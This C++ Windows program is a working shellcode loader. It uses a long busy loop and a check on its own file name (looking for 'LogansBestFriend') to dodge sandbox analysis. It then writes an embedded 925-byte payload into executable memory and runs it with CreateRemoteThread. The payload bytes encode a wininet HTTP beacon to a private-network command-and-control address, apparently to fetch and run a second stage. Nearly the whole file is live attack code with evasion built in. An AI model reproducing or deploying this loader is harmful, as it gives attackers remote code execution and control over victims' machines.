#include "Windows.h"
#include "stdio.h"
#include <iostream>
#include <string>
#include <regex>

#define MAX_OP 89888996 // Define a constant MAX_OP with a value of 89888996
void shellcode(); // Declare the shellcode function

using namespace std;

int main(int argc, char *argv[])
{
    char path [MAX_PATH]; // Declare a character array to hold the file path
    int cpt = 0; // Initialize an integer variable cpt to 0
    int i = 0; // Initialize an integer variable i to 0
    for (i = 0; i < MAX_OP; i++) // Loop MAX_OP times and increment cpt each time
    {
        cpt++;
    }
    if (cpt == MAX_OP) // Check if cpt is equal to MAX_OP
    {
        GetModuleFileNameA(NULL, path, MAX_PATH); // Get the file path of the current module
        regex str_expr ("(.*)(LogansBestFriend)(.*)"); // Define a regular expression pattern
        
        if (regex_match (path,str_expr)) { // Check if the file path matches the regular expression pattern
            shellcode(); // Call the shellcode function
        }
    }
    return 0; // Return 0 to indicate successful program execution
}

void shellcode() // Define the shellcode function
{
    
    
    /* length: 925 bytes */
    unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xe9\x93\x00\x00\x00\x5a\x48\x89\xc1\x41\xb8\xbb\x01\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x79\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x32\xc0\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\xba\x1f\x00\x00\x00\x6a\x00\x68\x80\x33\x00\x00\x49\x89\xe0\x41\xb9\x04\x00\x00\x00\x41\xba\x75\x46\x9e\x86\xff\xd5\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xb3\xe9\xe4\x01\x00\x00\xe8\x82\xff\xff\xff\x2f\x63\x6f\x6e\x73\x6f\x6c\x65\x3f\x74\x65\x73\x74\x31\x3d\x74\x65\x73\x74\x32\x00\xac\xbd\x0d\xc2\x38\x23\x9b\x56\xf3\x8c\x07\x9f\x81\xa1\xc2\x90\x68\x6e\x4c\x93\x6e\xd8\x02\x94\x5a\x46\xa5\x94\x73\x32\xf5\xac\x9a\x62\xcf\x67\xf2\xda\x2d\xed\xd3\x54\xe3\xdf\x2d\x69\x6c\xfe\xb9\xc2\xca\x44\x42\x87\x8b\x13\x3e\x5c\x00\x48\x6f\x73\x74\x3a\x20\x77\x68\x61\x74\x65\x76\x65\x72\x2e\x63\x6f\x6d\x0d\x0a\x41\x63\x63\x65\x70\x74\x3a\x20\x2a\x2f\x2a\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x65\x6e\x2d\x55\x53\x0d\x0a\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x63\x6c\x6f\x73\x65\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x38\x37\x2e\x33\x38\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d\x65\x2f\x34\x31\x2e\x30\x2e\x32\x32\x32\x38\x2e\x30\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x0d\x0a\x00\x71\x31\x22\x4f\x17\xb1\xa1\x70\x3e\xc5\x02\xc3\x89\xc3\x35\xdd\x0a\xe4\xb4\x63\x66\xbf\x03\x59\x53\x86\xa2\xad\x42\x32\x0d\x15\x56\x61\x8a\x83\xe1\x5a\x50\x12\x3d\xba\x69\x35\x4b\x4e\x01\xc4\x87\x59\x60\x87\x64\x34\x28\xc7\x4b\xd0\xe9\x77\xae\xef\xcc\x9a\x97\xe1\xdf\x4a\x3c\x24\x0d\x19\x57\x7a\x3f\xb6\x7a\x67\x57\x6f\xcf\xe4\x07\x5a\xfa\xdc\x2a\x1a\x2b\x6f\xcd\x34\x21\xe9\x2c\x37\x22\xa9\xe8\xc8\xee\x5d\x80\x74\x7a\x14\x72\xc8\x12\x65\x68\xb7\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x08\x00\x00\x00\x50\xc3\xe8\x7f\xfd\xff\xff\x31\x37\x32\x2e\x31\x36\x2e\x30\x2e\x31\x39\x00\x3a\xde\x68\xb1";


    HANDLE processHandle;
    HANDLE remoteThread; 
    PVOID remoteBuffer;

    DWORD pnameid = GetCurrentProcessId(); // Get the ID of the current process
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pnameid); // Open the current process with all access rights
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); // Allocate memory in the current process for the shellcode
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); // Write the shellcode to the remote buffer
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); // Create a remote thread to execute the shellcode
    CloseHandle(processHandle); // Close the process handle
    WaitForSingleObject(remoteThread, INFINITE);
    
}